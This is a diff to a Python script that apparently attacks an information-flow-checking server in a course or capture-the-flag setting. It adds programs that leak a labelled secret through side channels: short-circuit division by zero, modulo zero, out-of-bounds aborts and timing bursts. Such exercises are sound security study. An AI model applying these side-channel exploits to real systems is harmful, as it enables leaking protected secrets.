@@ -80,6 +80,29 @@ ABORT_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
 }
 """
 
+EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  bool witness = (secret < input) && ((1 / 0) == 0);
+  return 0;
+}
+"""
+
+EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  bool witness = (secret < input) && ((1 % 0) == 0);
+  return 0;
+}
+"""
+
+EXPR_ABORT_AND_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int[] A = alloc_array(int, 1);
+  //@label H;
+  bool witness = (secret < input) && (A[1] == 0);
+  return 0;
+}
+"""
+
 TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
   if (secret < input) {
     while (true) {
@@ -404,6 +427,17 @@ def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
 """
 
 
+def make_short_circuit_timing_program(*, term_count: int) -> str:
+    term = "((1 + 1) == 2)"
+    heavy = " && ".join([term] * term_count)
+    return f"""int main(int input, int secret) {{
+  //@label H;
+  bool burn = (secret < input) && ({heavy});
+  return 0;
+}}
+"""
+
+
 def recover_from_timing_oracle(
     *,
     server_command: str,
@@ -414,12 +448,28 @@ def recover_from_timing_oracle(
 ) -> int:
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
+    sc_term_candidates = [800, 1600, 3200, 6400]
     min_ratio = 1.06
     min_gap_s = 0.010
 
-    last_failure = "no timing candidates worked"
+    candidates: list[tuple[str, str]] = []
     for burn in burn_candidates:
-        source = make_timing_oracle_program(warmup_iters=1_000_000, burn_iters=burn)
+        candidates.append(
+            (
+                f"loop-burn={burn}",
+                make_timing_oracle_program(warmup_iters=1_000_000, burn_iters=burn),
+            )
+        )
+    for term_count in sc_term_candidates:
+        candidates.append(
+            (
+                f"short-circuit-terms={term_count}",
+                make_short_circuit_timing_program(term_count=term_count),
+            )
+        )
+
+    last_failure = "no timing candidates worked"
+    for candidate_name, source in candidates:
         with ProgramFile(source) as path:
             try:
                 t_false = median_runtime_for_input(
@@ -440,19 +490,19 @@ def recover_from_timing_oracle(
                 )
             except StrategyFailed as e:
                 last_failure = str(e)
-                debug_log(debug, f"[timing] burn={burn}: {last_failure}")
+                debug_log(debug, f"[timing] {candidate_name}: {last_failure}")
                 continue
 
             ratio = t_true / max(t_false, 1e-9)
             gap = t_true - t_false
             debug_log(
                 debug,
-                f"[timing] burn={burn}: baseline={t_false:.4f}s true={t_true:.4f}s "
+                f"[timing] {candidate_name}: baseline={t_false:.4f}s true={t_true:.4f}s "
                 f"ratio={ratio:.3f} gap={gap:.4f}s",
             )
             if ratio < min_ratio or gap < min_gap_s:
                 last_failure = (
-                    f"insufficient separation for burn={burn} "
+                    f"insufficient separation for {candidate_name} "
                     f"(ratio={ratio:.3f}, gap={gap:.4f}s)"
                 )
                 continue
@@ -481,7 +531,7 @@ def recover_from_timing_oracle(
             if boundary_lo or not boundary_hi:
                 last_failure = (
                     "timing boundary check failed "
-                    f"for burn={burn} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
+                    f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
                 )
                 debug_log(debug, f"[timing] {last_failure}")
                 continue
@@ -544,6 +594,39 @@ def recover_server_secret(
                 userid=userid,
                 timeout_s=tuned_query_timeout,
                 program_source=IMPLICIT_BOOLEAN_PROGRAM,
+            ),
+        ),
+        (
+            "expr abort oracle (&& div0)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (&& mod0)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (&& oob)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_ABORT_AND_OOB_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
             ),
         ),
         (
